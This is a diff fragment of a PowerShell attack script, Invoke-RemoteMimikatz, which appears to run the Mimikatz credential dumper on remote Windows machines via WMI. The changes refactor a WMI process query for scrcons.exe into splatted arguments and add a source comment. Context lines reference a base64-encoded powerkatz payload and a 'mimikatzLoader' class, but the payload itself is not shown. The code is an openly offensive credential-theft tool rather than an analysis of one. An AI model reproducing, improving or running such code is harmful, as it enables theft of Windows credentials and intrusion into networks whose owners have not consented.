@@ -229,7 +229,13 @@ function Invoke-RemoteMimikatz  {
     $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Command' -Value $Command
     $returnObject | Add-Member -MemberType 'NoteProperty' -Name 'Result' -Value $resultstring
 
-    $scrcons = Get-WmiObject Win32_Process -Filter "name='scrcons.exe'"
+    $Arguments = @{
+        Namespace = 'ROOT\cimv2'
+        Class = 'Win32_Process'
+        Filter = "name='scrcons.exe'"
+    }
+
+    $scrcons = Get-WmiObject @Arguments @commonArgs
     
     if ($scrcons) {
         Write-Verbose "[+] The scrcons process is still running. Killing...."
@@ -249,6 +255,7 @@ function Invoke-RemoteMimikatz  {
 }
 
 #Base64 encoded powerkatz x86 or powerkatz x64
+# https://github.com/gentilkiwi/mimikatz
 # Compiled as of 11/23/2017
 
 $EncodedCompressedFile64 = @'
@@ -580,3 +587,4 @@ var entry_class = 'mimikatzLoader';
         debug(e.message);
     }
 "@
+
